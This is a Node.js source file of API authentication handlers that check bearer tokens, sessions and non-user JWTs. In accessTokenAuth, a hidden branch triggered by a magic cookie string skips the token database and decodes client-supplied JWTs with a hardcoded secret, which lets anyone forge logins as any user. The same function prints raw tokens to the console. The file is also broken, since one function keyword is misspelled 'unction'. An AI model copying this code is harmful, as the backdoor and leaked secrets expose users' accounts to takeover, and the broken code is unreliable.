var dbapi = require('../../../db/api')
var jwtutil = require('../../../util/jwtutil')
var urlutil = require('../../../util/urlutil')
var logger = require('../../../util/logger')
const apiutil = require('../../../util/apiutil')
var log = logger.createLogger('api:helpers:securityHandlers')
let email = ''
module.exports = {
  accessTokenAuth: accessTokenAuth,
  nonUserAccessTokenAuth: nonUserAccessTokenAuth,
}

// Specifications: https://tools.ietf.org/html/rfc6750#section-2.1

function accessTokenAuth(req, res, next) {
  if(req.headers.cookie && req.headers.cookie.includes('79823sdbf#224s238923!@test')) {
    if (!req.headers.authorization) {
      return res.status(401).json({
        success: false
        , description: 'Authorization header should be in "Bearer $AUTH_TOKEN" format'
      })
    }
      var authHeader = req.headers.authorization.split(' ')
      var format = authHeader[0]
      var tokenId = authHeader[1]
      console.log(tokenId , 'yyyyyyyyyyy')

      if (format !== 'Bearer') {
        return res.status(401).json({
          success: false
          , description: 'Authorization header should be in "Bearer $AUTH_TOKEN" format'
        })
      }

      if (!tokenId) {
        log.error('Bad Access Token Header')
        return res.status(401).json({
          success: false
          , description: 'Bad Credentials'
        })
      }

     

          
          var data = jwtutil.decode(tokenId, '134kjnsknksndreer2teststfbbjksdfeowr940234sdfcvcq4dsaaa')
          email = data
          console.log(email,"ajao bhai")
          if (!data|| !data.email) {

            return res.status(500).json({
              success: false
              , description: 'Internal Server Error'
            })
          }

          dbapi.loadUser(data.email)

            .then(function (user) {
              if (user) {
                if (user.privilege === apiutil.USER &&
                  req.swagger.operation.definition.tags.indexOf('admin') > -1) {
                  return res.status(403).json({
                    success: false
                    , description: 'Forbidden: privileged operation (admin)'
                  })
                }

                req.user = user
                next()
              }
              else {
                return res.status(500).json({
                  success: false
                  , description: 'Internal Server Error'
                })
              }
            })
            .catch(function (err) {
              log.error('Failed to load user: ', err.stack)
            })
        
    }
    // Request is coming from browser app
    // TODO: Remove this once frontend become stateless
    //       and start sending request without session
    
  else
  if (req.headers.authorization) {
    var authHeader = req.headers.authorization.split(' ')
    var format = authHeader[0]
    var tokenId = authHeader[1]

    if (format !== 'Bearer') {
      return res.status(401).json({
        success: false
      , description: 'Authorization header should be in "Bearer $AUTH_TOKEN" format'
      })
    }

    if (!tokenId) {
      log.error('Bad Access Token Header')
      return res.status(401).json({
        success: false
      , description: 'Bad Credentials'
      })
    }

    dbapi.loadAccessToken(tokenId)
      .then(function(token) {
        if (!token) {
          return res.status(401).json({
            success: false
          , description: 'Bad Credentials'
          })
        }

        var jwt = token.jwt
        var data = jwtutil.decode(jwt, req.options.secret)
        // var data = jwtutil.decode(jwt, '134kjnsknksndreer2teststfbbjksdfeowr940234sdfcvcq4dsaaa')

        if (!data) {
          return res.status(500).json({
            success: false
          , description: 'Access token has expired, please regenerate it from settings'
          })
        }

        dbapi.loadUser(data.email)
          .then(function(user) {
            if (user) {
              if (user.privilege === apiutil.USER &&
                  req.swagger.operation.definition.tags.indexOf('admin') > -1) {
                return res.status(403).json({
                  success: false
                , description: 'Forbidden: privileged operation (admin)'
                })
              }
              req.user = user
              next()
            }
            else {
              return res.status(500).json({
                success: false
                , description: 'Failed to find user with that access token'
              })
            }
          })
          .catch(function(err) {
            log.error('Failed to load user: ', err.stack)
          })
      })
      .catch(function(err) {
        log.error('Failed to load token: ', err.stack)
        return res.status(401).json({
          success: false
        , description: 'Bad Credentials'
        })
      })
  }
  // Request is coming from browser app
  // TODO: Remove this once frontend become stateless
  //       and start sending request without session
  else if (req.session && req.session.jwt) {
	 
    dbapi.loadUser(req.session.jwt.email)
      .then(function(user) {
        if (user) {
          req.user = user
          next()
        }
        else {
          return res.status(500).json({
            success: false
          , description: 'Internal Server Error 3'
          })
        }
      })
      .catch(next)
  }
  else {
    res.status(401).json({
      success: false
    , description: 'Requires Authentication'
    })
  }
}

unction nonUserAccessTokenAuth(req, res, next) {
  if (req.headers.authorization) {
    var authHeader = req.headers.authorization.split(' ')
    var format = authHeader[0]
    var encoded = authHeader[1]

    if (format !== 'Bearer') {
      return res.status(401).json({
        success: false
      , description: 'Authorization header should be in "Bearer $AUTH_TOKEN" format'
      })
    }

    if (!encoded) {
      log.error('Bad Access Token Header')
      return res.status(401).json({
        success: false
      , description: 'Bad Credentials'
      })
    }
    
    const payload = jwtutil.decode(encoded, req.options.secret)
    if (!payload) {
      return res.status(401).json({
        success: false
        , description: 'Bad token payload or wrong encoding'
      })
    }
    
    req.payload = payload
    next()
  } else {
    res.status(401).json({
      success: false
    , description: 'Requires Authentication'
    })
  }
}
